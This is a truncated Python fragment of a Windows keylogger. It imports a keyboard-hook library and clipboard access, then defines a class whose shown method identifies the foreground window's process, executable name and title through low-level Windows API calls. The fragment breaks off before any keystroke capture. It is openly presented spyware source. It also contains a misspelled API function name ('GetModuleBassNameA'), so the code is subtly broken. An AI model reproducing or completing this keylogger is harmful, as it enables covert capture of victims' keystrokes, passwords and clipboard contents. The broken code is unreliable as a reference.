from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard


TIMEOUT = 60 * 10


class KeyLogger:
  def __init__(self):
    self.current_window = None

  def get_current_process(self):
    hwnd = windll.user32.GetForegroundWindow()
    pid = c_ulong(0)
    windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = f'{pid.value}'

    executable = create_string_buffer(512)
    h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
    windll.psapi.GetModuleBassNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer(512)
    windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
    try:
      self.current_window = window_title.value.decode()
